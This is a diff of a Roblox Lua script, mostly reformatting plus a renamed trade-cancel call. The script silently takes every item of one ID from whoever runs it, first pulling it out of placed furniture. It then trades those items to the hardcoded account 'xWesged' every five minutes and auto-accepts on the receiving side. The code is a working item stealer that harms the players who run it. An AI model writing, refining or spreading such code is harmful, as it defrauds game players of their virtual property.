@@ -15,12 +15,11 @@ local Shop = Events:WaitForChild("Shop")
 local SendInvite = Trading:WaitForChild("SendInvite")
 local AcceptInvite = Trading:WaitForChild("AcceptInvite")
 local AcceptTrade = Trading:WaitForChild("AcceptTrade")
-local CancelTrade = Trading:WaitForChild("CancelTrade")
+local DeclineTrade = Trading:WaitForChild("DeclineTrade")
 local AddItem = Trading:WaitForChild("AddItem")
 local RemoveItem = Trading:WaitForChild("RemoveItem")
 
 local InsertFurniture = Shop:WaitForChild("InsertFurniture")
-
 local GetAll = Data:WaitForChild("GetAll")
 
 local TARGET = "xWesged"
@@ -29,15 +28,10 @@ local CHECK_DELAY = 300
 
 local TRADE_DISABLED = false
 
-------------------------------------------------
--- DATA
-------------------------------------------------
-
 local function getData()
     local success,data = pcall(function()
         return GetAll:InvokeServer()
     end)
-
     if success then
         return data
     end
@@ -46,32 +40,20 @@ end
 local function getItems()
     local data = getData()
     if not data then return {} end
-
     local items = {}
-
     for guid,item in pairs(data.Inventory or {}) do
         if tonumber(item.Id) == ITEM_ID then
-            table.insert(items,{
-                GUID = guid,
-                Id = item.Id,
-                Type = "Item"
-            })
+            table.insert(items,{GUID = guid,Id = item.Id,Type = "Item"})
         end
     end
-
     return items
 end
-
-------------------------------------------------
--- REMOVE FURNITURE
-------------------------------------------------
 
 local RemoveFurniture = Events:WaitForChild("Housing"):WaitForChild("RemoveFurniture")
 
 local function getFurnitureFolder()
     local plots = Workspace:FindFirstChild("Plots")
     if not plots then return end
-
     for _,plot in pairs(plots:GetChildren()) do
         if plot:FindFirstChild("Owner") and plot.Owner.Value == player then
             return plot:FindFirstChild("Furniture")
@@ -82,163 +64,109 @@ end
 local function removePlacedFurniture()
     local folder = getFurnitureFolder()
     if not folder then return end
-
     for _,model in ipairs(folder:GetChildren()) do
         if model:IsA("Model") then
-
             local id = model:GetAttribute("ItemId")
-
             if id and tonumber(id) == ITEM_ID then
                 pcall(function()
                     RemoveFurniture:InvokeServer(model)
                 end)
-
                 task.wait(0.1)
             end
         end
     end
 end
 
-------------------------------------------------
--- TRADE FUNCTIONS
-------------------------------------------------
-
 local function waitTrade()
     repeat task.wait(1)
-    until player.PlayerGui:FindFirstChild("Trade")
-       or player.PlayerGui:FindFirstChild("Trading")
+    until player.PlayerGui:FindFirstChild("Trade") or player.PlayerGui:FindFirstChild("Trading")
 end
 
 local function addItems(items)
-
     local added = {}
     local start = tick()
-
     for _,item in ipairs(items) do
-
         if tick() - start > 60 and #added == 0 then
-
             TRADE_DISABLED = true
-
             pcall(function()
-                CancelTrade:InvokeServer()
+                DeclineTrade:FireServer(TARGET)
             end)
-
             return nil
         end
-
         if #added >= 16 then break end
-
         local ok,res = pcall(function()
             return AddItem:InvokeServer(item)
         end)
-
         if ok and res then
             table.insert(added,item)
         end
-
         task.wait(.2)
     end
-
     return added
 end
 
 local function acceptTrade(added)
-
     while true do
-
         local ok,res = pcall(function()
             return AcceptTrade:InvokeServer()
         end)
-
         if ok and res then
             return true
         end
-
         if #added == 0 then
             return false
         end
-
         local item = table.remove(added)
-
         pcall(function()
             RemoveItem:InvokeServer(item)
         end)
-
         task.wait(.5)
     end
 end
 
 local function waitFinish()
     repeat task.wait(1)
-    until not player.PlayerGui:FindFirstChild("Trade")
-       and not player.PlayerGui:FindFirstChild("Trading")
+    until not player.PlayerGui:FindFirstChild("Trade") and not player.PlayerGui:FindFirstChild("Trading")
 end
 
 local function tradeItems()
-
     local items = getItems()
-
     if #items == 0 then
         return
     end
-
     removePlacedFurniture()
-
     SendInvite:InvokeServer(TARGET)
-
     waitTrade()
-
     local added = addItems(items)
     if not added then return end
-
     if #added == 0 then return end
-
     local success = acceptTrade(added)
-
     if success then
         waitFinish()
     end
 end
 
-------------------------------------------------
--- PLACE ITEMS (xWesged)
-------------------------------------------------
-
 local function getPlot()
-
     local own = player:WaitForChild("NonSaveVars"):WaitForChild("OwnsPlot")
-
-    repeat task.wait()
-    until own.Value ~= 0
-
+    repeat task.wait() until own.Value ~= 0
     return Workspace.Plots:WaitForChild(tostring(own.Value))
 end
 
 local function placeItems()
-
     local plot = getPlot()
     local canvas = plot.Interior.Shop1.Canvas
-
     local inventory = getItems()
-
     if #inventory == 0 then
         return
     end
-
     math.randomseed(tick())
-
     local cx,cy,cz = canvas.Position.X,canvas.Position.Y,canvas.Position.Z
     local sx,sy,sz = canvas.Size.X/2,canvas.Size.Y/2,canvas.Size.Z/2
-
     for _,item in ipairs(inventory) do
-
         local rx = cx + math.random(-sx*100,sx*100)/100
         local rz = cz + math.random(-sz*100,sz*100)/100
         local ry = cy + sy + math.random(5,40)
-
         pcall(function()
-
             InsertFurniture:InvokeServer({
                 GUID = item.GUID,
                 Type = "Decor",
@@ -246,84 +174,51 @@ local function placeItems()
                 Id = item.Id,
                 CFrame = CFrame.new(rx,ry,rz)
             })
-
         end)
-
         task.wait(.1)
     end
 end
 
-------------------------------------------------
--- xWESGED MODE
-------------------------------------------------
-
 if player.Name == "xWesged" then
-
     placeItems()
-
     local pendingInvites = {}
     local inTrade = false
-
     local function isTradeUI()
-        return player.PlayerGui:FindFirstChild("Trade")
-            or player.PlayerGui:FindFirstChild("Trading")
-            or player.PlayerGui:FindFirstChild("TradingPrompt")
+        return player.PlayerGui:FindFirstChild("Trade") or player.PlayerGui:FindFirstChild("Trading") or player.PlayerGui:FindFirstChild("TradingPrompt")
     end
-
     local function acceptNext()
-
         if inTrade then return end
         if #pendingInvites == 0 then return end
-
         inTrade = true
-
         local inviter = table.remove(pendingInvites,1)
-
         pcall(function()
             AcceptInvite:InvokeServer(inviter)
         end)
     end
-
     RunService.Heartbeat:Connect(function()
-
         if not isTradeUI() and inTrade then
             inTrade = false
             acceptNext()
         end
-
         if isTradeUI() then
             pcall(function()
                 AcceptTrade:InvokeServer()
             end)
         end
     end)
-
     Trading.Invite.OnClientEvent:Connect(function(data)
-
         local name = data.Name or data
-
         table.insert(pendingInvites,name)
-
         if not inTrade then
             acceptNext()
         end
     end)
-
-------------------------------------------------
--- NORMAL MODE
-------------------------------------------------
-
 else
-
     while true do
-
         if TRADE_DISABLED then
             break
         end
-
         pcall(tradeItems)
-
         task.wait(CHECK_DELAY)
     end
-
 end
